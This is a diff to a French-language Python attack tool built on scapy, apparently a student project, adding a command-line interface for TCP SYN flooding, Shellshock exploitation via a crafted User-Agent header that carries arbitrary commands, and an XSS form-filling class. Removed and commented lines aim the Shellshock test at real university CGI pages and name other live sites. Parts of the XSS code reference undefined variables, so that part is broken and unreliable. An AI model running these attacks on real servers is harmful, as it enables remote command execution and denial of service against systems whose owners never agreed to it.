@@ -5,7 +5,7 @@
 
 
 ## TODO:
-##  - tester port range sur le syn flood
+##  - vérifier que le code HTTP est 200 avant de poursuivre une attaque
 
 
 from scapy.all import *
@@ -176,13 +176,6 @@ class HTTP(object):
 
 
     def GET(self, page = '', con=None):
-        # print "Going to... " + target
-        # target = target.replace('http://', '')
-        # try : host, page = target.split('/', 1)
-        # except :
-        #     host = target
-        #     page = ''
-        # if len(target) == 1 : target.append('')
 
         # Handshake
         if con == None:
@@ -221,8 +214,12 @@ class HTTP(object):
             form['inputs'] = {}
             for e in inputs:
                 params = dict(HTTP.PARAM_REGEX.findall(e))
-                try: form['inputs'][params['name']] = params
-                except: form['inputs'][params['type']] = params
+
+                try: name = params['name']
+                except: name = params['type']
+
+                form['inputs'][name] = params
+                if 'required' in params: form['inputs'][name]['required'] = True
 
             self.get[page]['forms'].append(form)
         return self.get[page]['forms']
@@ -299,8 +296,8 @@ class HTTP(object):
 class ShellShock(HTTP):
     USER_AGENT = "() { :; };"#ping -c 15 -p 5348454c4c5f53484f434b5f574f524b -s 32 "}
 
-    def __init__(self, host, script_page):
-        super(ShellShock, self).__init__(host)
+    def __init__(self, host, script_page, header = {}):
+        super(ShellShock, self).__init__(host, header = header)
         # self.host = HTTP(host)
         self.target = script_page
 
@@ -314,33 +311,119 @@ class ShellShock(HTTP):
             print "Faille exploitable sur " + self.host
             return True
         else:
+            print "Faille non exploitable sur " + self.host
             return False
 
     def run(self, command):
         self.setHeader('User-Agent', ShellShock.USER_AGENT + command)
         self.GET(self.target)
 
+class XSS():
+    def __init__(self, host, page, cookie = None):
+        print host, page
+        self.target = HTTP(host, header = {'Cookie': cookie} if cookie else {})
+        self.page = page
+
+    def selectForms(self, forms):
+        selected_forms = []
+        for form in forms:
+            if self.fieldname in form['inputs']:
+                selected_forms.append(form)
+        return selected_forms
+
+    def printForms(self, forms):
+        for i in range(len(sf)):
+            print "Form ID: ", i
+            print "Method: ", sf[i]['method']
+            print "Action: ", sf[i]['action']
+            print "Inputs:"
+            for j in sf[i]['inputs']: print '\t- ', j, ': ', sf[i]['inputs'][j]['type'], sf[i]['inputs'][j]
+            print '\n\n'
+
+    def fillForm(self, form, fv):
+        data = {}
+        for name in form['inputs']:
+            inp = form['inputs'][name]
+            if not 'name' in inp: continue
+            if inp['type'] in ['reset', 'button', 'submit']: continue
+
+            if inp['type'] in ['text', 'password', 'url', 'search']:
+                if i in fv: data[name] = fv[name]
+                else: data[name] = "xss testing"
+
+            # A modifier
+            else:
+                data[name] = ""
+        return data
+
+    def run(self, fieldname, fieldvalue = {}):
+        self.target.GET(self.page)
+        self.fieldname = fieldname
+        self.fieldname = fieldname
+
+        sf = self.selectForms(self.target.getForms(self.page))
+
+        if len(sf) > 1:
+            self.printForms(sf)
+            id = -1
+            while id < 0 or id > len(sf):
+                id = input('Plusieurs formulaires affichés ci-dessus ont été trouvés.\nMerci de spécifier celui à utiliser (rentrer un l\'ID entre 0 et ' + str(len(sf) - 1) + ') ? ')
+        elif len(sf) == 0:
+            print "Aucun formulaire contenant un champ '" + fieldname + "'. Abandon."
+            return 0
+
+        form = sf[id]
+        print self.fillForm(form, fieldvalue)
+
+def parseTarget(target):
+    target = target.replace('http://', '')
+    target = target.replace('https://', '')
+    try : host, page = target.split('/', 1)
+    except :
+        host = target
+        page = ''
+    return host, page
+
 if __name__ == "__main__":
     conf.L3socket=L3RawSocket
 
-    # parser = argparse.ArgumentParser(
-    #     formatter_class=argparse.ArgumentDefaultsHelpFormatter,
-    #     description="Print HTTP Request headers (must be run as root or with capabilities to sniff).",
-    # )
-    # parser.add_argument("--interface", "-i", help="Which interface to sniff on.", default="eth0")
-    # parser.add_argument("--filter", "-f", help='BPF formatted packet filter.', default="tcp and port 80")
-    # parser.add_argument("--count", "-c", help="Number of packets to capture. 0 is unlimited.", type=int, default=0)
-    # args = parser.parse_args()
+    parser = argparse.ArgumentParser(
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
+        description="Outil d'audit d'attaques sur application web et serveurs.")
 
-    # Usage: args.count, args.filter, ...
+    parser.add_argument("target", help="Hote (ou url) à attaquer.", action='store')
+    parser.add_argument("-t", "--tcp-syn-flood", help='Fait un TCP SYN flood (DOS) sur la cible.', action='store_true')
+    parser.add_argument("-p", "--port", help='Port cible pour une attaque DOS.', action='store', type=int, default=80)
+    parser.add_argument("-s", "--shellshock", help='Teste la vulnérabilité à Shellshock (nécessite un cgi comme cible)', action='store_true')
+    parser.add_argument("-c", "--cookie", help='Cookie à utiliser', action='store')
+    parser.add_argument("-x", "--xss", help='Teste une attaque XSS sur l\'hote cible.', action='store_true')
+    parser.add_argument("-f", "--fieldname", help="Nom du champs à attaquer pour les attaques XSS ou les injections SQL.", action='store')
+    parser.add_argument("-v", "--fieldvalue", help="Valeur par défaut d'un autre champ (optionnel) format champ=valeur.", action='append', default=[])
+    args = parser.parse_args()
+    # print args
 
-    # site = HTTP("eleve.scrjpl.fr")
-    # site = HTTP("korben.info")
-    # site = HTTP("192.168.0.21")
+    host, page = parseTarget(args.target)
+
+    if args.xss:
+        attack = XSS(host, page, args.cookie)
+        attack.run(args.fieldname, dict([i.split('=') for i in args.fieldvalue]))
+
+    elif args.shellshock:
+        victim = ShellShock(host, page)
+        victim.test()
+        # if victim.test():
+        #     victim.run("echo; whoami")
+        #     print victim.get["cgi-bin/test.sh"]['data']
+
+    elif args.tcp_syn_flood:
+        victim = DOS(host, args.port)
+        victim.test()
+
+
+
     #
     # html_rep = site.GET('groups/new.php')
     # html_rep = site.GET('index.nginx-debian.html')
-    # html_rep = site.GET('test.html')
     #
     # code = html_rep['code']
     #
@@ -352,17 +435,3 @@ if __name__ == "__main__":
     # elif code == 200:
     #     print html_rep['data']
     #     print code
-
-    # f = DOS("192.168.0.17", 80)
-    # f.tcp_syn_flood()
-    # http://service.tsi.telecom-paristech.fr/cgi-bin/conference/list.cgi
-    url = "biblio.telecom-paristech.fr/cgi-bin/download.cgi"
-    url = url.replace('http://', '')
-    host, page = url.split('/', 1)
-
-    # victim = ShellShock("192.168.0.21", "cgi-bin/test.sh")
-    victim = ShellShock(host, page)
-    victim.test()
-    # if victim.test():
-    #     victim.run("echo; whoami")
-    #     print victim.get["cgi-bin/test.sh"]['data']
